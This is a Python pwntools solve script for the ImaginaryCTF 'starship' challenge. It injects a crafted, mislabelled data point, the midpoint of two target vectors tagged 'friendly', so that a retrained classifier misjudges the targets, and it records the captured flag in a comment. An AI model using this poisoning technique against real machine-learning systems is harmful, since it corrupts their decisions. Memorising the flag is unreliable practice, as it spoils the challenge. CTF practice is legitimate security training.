#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
p = remote("starship.chal.imaginaryctf.org", 1337)

p.sendlineafter(b"> ", b"4")

p.readuntil(b"target 1: ")

target1 = p.readline().decode().split("|")[0][:-1].split(",")

p.readuntil(b"target 2: ")

target2 = p.readline().decode().split("|")[0][:-1].split(",")

between = ""
for i in range(9):
    between += f"{(int(target1[i]) + int(target2[i])) // 2},"
between += "friendly"

p.sendlineafter(b"> ", b"42")
p.sendlineafter(b"enter data: ", between.encode())

p.sendlineafter(b"> ", b"2")

p.sendlineafter(b"> ", b"4")

p.readline()
p.readline()

log.success(p.readline().decode()) # ictf{m1ssion_succ3ss_8fac91385b77b026}
